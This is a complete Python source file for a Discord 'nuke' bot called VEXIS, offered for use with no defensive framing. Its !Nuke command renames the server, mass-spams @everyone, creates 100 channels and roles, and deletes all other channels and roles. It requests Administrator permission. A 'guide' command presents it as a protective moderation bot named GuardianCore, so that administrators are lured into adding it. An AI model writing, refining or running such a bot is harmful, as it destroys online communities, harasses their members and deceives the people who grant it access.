import discord
from discord.ext import commands
from discord.ui import Button, View
import asyncio
import aiohttp
import os

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

LOGO = """
██████╗ ██╗   ██╗ ██╗   ██╗██████╗ ██████╗ ██╗███████╗██████╗ ███████╗██████╗ 
██╔══██╗██║   ██║ ██║   ██║██╔══██╗██╔══██╗██║██╔════╝██╔══██╗██╔════╝██╔══██╗
██║  ██║██║   ██║ ██║   ██║██████╔╝██████╔╝██║█████╗  ██████╔╝█████╗  ██████╔╝
██║  ██║██║   ██║ ╚██╗ ██╔╝██╔══██╗██╔══██╗██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝  ╚████╔╝ ██║  ██║██║  ██║██║██║     ██║  ██║███████╗██║  ██║
╚═════╝  ╚═════╝    ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                         VEXIS
"""

SPAM_MESSAGE = f"@everyone @here **SCAMMERS THATS WHAT U GET STORM HUB IS BOOTY SON discord.gg/vexis**\n```{LOGO}```\nhttps://discord.gg/vexis"

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1487234051994812628&permissions=8&integration_type=0&scope=bot+applications.commands"

PROTECTED_SERVERS = [
    1486862063904227469,
]

OWNER_ID = 1219335273415053430

NUKE_IMAGE_URL = "https://i.imgur.com/your-nuke-image.png"

class InviteButton(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(Button(
            label="Add Nuke Bot", 
            style=discord.ButtonStyle.danger, 
            emoji="💀", 
            url=INVITE_URL
        ))

async def spam_channel_fast(channel, waves=3):
    for _ in range(waves):
        try:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(0.2)
        except:
            pass

async def spam_all_channels_fast(guild, waves=3):
    text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
    if not text_channels:
        return
    tasks = [spam_channel_fast(ch, waves) for ch in text_channels]
    await asyncio.gather(*tasks)

async def change_server_logo(guild):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(NUKE_IMAGE_URL) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(icon=image_data)
                    return True
    except Exception as e:
        print(f"Failed to change server logo: {e}")
    return False

async def change_server_name(guild):
    try:
        await guild.edit(name="GET NUKED SCAMMERS")
        return True
    except Exception as e:
        print(f"Failed to change server name: {e}")
        return False

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    print("VEXIS online. 💀")
    print(f"Protected servers: {PROTECTED_SERVERS}")
    
    try:
        await bot.tree.sync()
        print("✅ Slash commands synced!")
    except Exception as e:
        print(f"⚠️ Slash command sync error: {e}")
    
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="!Nuke | discord.gg/vexis"
        )
    )

@bot.tree.command(name="setup", description="[OWNER ONLY] Deploy the nuke bot invitation embed")
async def slash_setup(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="⛔ Access Denied",
            description="This command is restricted to the bot owner only.",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    embed = discord.Embed(
        title="💀 VEXIS Nuke Bot 💀",
        description="**The most destructive Discord nuke bot ever created.**",
        color=0xff0000
    )
    embed.add_field(
        name="📝 How To Use:", 
        value="```!Nuke```\nType `!Nuke` in **ANY SERVER** where this bot has Administrator permissions.\n\n**ANYONE** can use it - no role required.\n\nThe bot will NUKE everything.", 
        inline=False
    )
    embed.set_footer(text="VEXIS - discord.gg/vexis")
    
    view = InviteButton()
    await interaction.response.send_message(embed=embed, view=view)

@bot.command()
@is_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💀 VEXIS Nuke Bot 💀",
        description="**The most destructive Discord nuke bot ever created.**",
        color=0xff0000
    )
    embed.add_field(
        name="📝 How To Use:", 
        value="```!Nuke```\nType `!Nuke` in **ANY SERVER** with Admin permissions.", 
        inline=False
    )
    embed.set_footer(text="VEXIS - discord.gg/vexis")
    
    view = InviteButton()
    await ctx.send(embed=embed, view=view)

@bot.command()
async def guide(ctx):
    embed = discord.Embed(
        title="🛡️ GuardianCore - Moderation Bot",
        description="Your server's ultimate protection.",
        color=0x2b2d31
    )
    embed.add_field(name="🔧 Features", value="• Anti-raid protection\n• Auto-moderation\n• Advanced logging", inline=False)
    embed.set_footer(text="GuardianCore - Protecting servers")
    
    view = InviteButton()
    await ctx.send(embed=embed, view=view)

@bot.command()
async def invite(ctx):
    embed = discord.Embed(
        title="💀 Add VEXIS Nuke Bot",
        description="Click the button below to add this bot.",
        color=0xff0000
    )
    embed.set_footer(text="VEXIS - Total Server Annihilation")
    
    view = InviteButton()
    await ctx.send(embed=embed, view=view)

@bot.command()
async def Nuke(ctx):
    guild = ctx.guild

    if not guild:
        await ctx.send("This command must be used in a server.")
        return

    if guild.id in PROTECTED_SERVERS:
        await ctx.send("🛡️ This server is protected.")
        return

    await ctx.send("💀 **VEXIS NUKE ENGAGED** 💀")
    
    name_changed = await change_server_name(guild)
    icon_changed = await change_server_logo(guild)
    
    await ctx.send(f"**VEXIS HAS ENTERED THE CHAT**\n```{LOGO}```\n💀 **SCAMMERS THATS WHAT U GET STORM HUB IS BOOTY SON discord.gg/vexis** 💀")

    await spam_all_channels_fast(guild, waves=5)

    channel_tasks = []
    for i in range(100):
        channel_tasks.append(guild.create_text_channel(f"vexis-{i}"))
    
    created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
    valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
    
    if valid_channels:
        spam_tasks = [spam_channel_fast(ch, waves=5) for ch in valid_channels]
        await asyncio.gather(*spam_tasks)

    role_tasks = []
    for i in range(100):
        role_tasks.append(guild.create_role(name=f"SCAMMER GET REKT {i}"))
    
    await asyncio.gather(*role_tasks, return_exceptions=True)

    delete_tasks = []
    for channel in guild.channels:
        if channel not in valid_channels:
            try:
                delete_tasks.append(channel.delete())
            except:
                pass
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)

    delete_role_tasks = []
    for role in guild.roles:
        if role.name != "@everyone" and not role.name.startswith("SCAMMER GET REKT"):
            try:
                delete_role_tasks.append(role.delete())
            except:
                pass
    
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    await spam_all_channels_fast(guild, waves=5)

    await ctx.send(f"**NUKE COMPLETE.**\n```{LOGO}```\n**VEXIS OWNS THIS GRAVEYARD NOW.** 💀🔥")

# Run the bot with Railway token
TOKEN = os.getenv('TOKEN')
if TOKEN:
    bot.run(TOKEN)
else:
    print("Error: TOKEN not found in environment variables!")
